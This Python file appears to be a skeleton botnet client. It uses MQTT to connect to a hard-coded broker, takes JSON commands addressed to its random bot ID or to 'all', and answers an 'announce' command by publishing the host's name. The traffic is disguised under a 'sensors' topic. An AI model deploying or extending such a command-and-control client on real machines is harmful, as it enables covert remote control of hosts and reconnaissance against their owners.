import paho.mqtt.client as mqtt
import json
import time
import socket
import random

# Configuration
MQTT_BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
BOT_ID = "bot_" + str(random.randint(1, 1000))


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Bot {BOT_ID} connected.")
        client.subscribe(TOPIC)
    else:
        print(f"Connection failed. Code: {rc}")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())

        # Message for me?
        target = payload.get("target_id")
        if target != BOT_ID and target != "all":
            return

        sender = payload.get("sender_id")
        action = payload.get("action")
        params = payload.get("params")
        print(f"Received {action} from {sender}")

        if action == "announce":
            announce(client, sender)
        else:
            print(f"Unknown action: {action}")

    except json.JSONDecodeError:
        print("Received non-JSON message")
    except Exception as e:
        print(f"Error processing message: {e}")


# --- Announce ---
def announce(client, sender):
    response = {
        "target_id": sender,
        "sender_id": BOT_ID,
        "type": "presence",
        "status": "online",
        "hostname": socket.gethostname(),
        "timestamp": time.time()
    }

    message = json.dumps(response)
    client.publish(TOPIC, message)
    print(f"Announced message: {message}")


def main():
    client = mqtt.Client(client_id=BOT_ID)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_BROKER, PORT, 60)
        client.loop_forever()
    except KeyboardInterrupt:
        print("Bot stopping...")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    main()
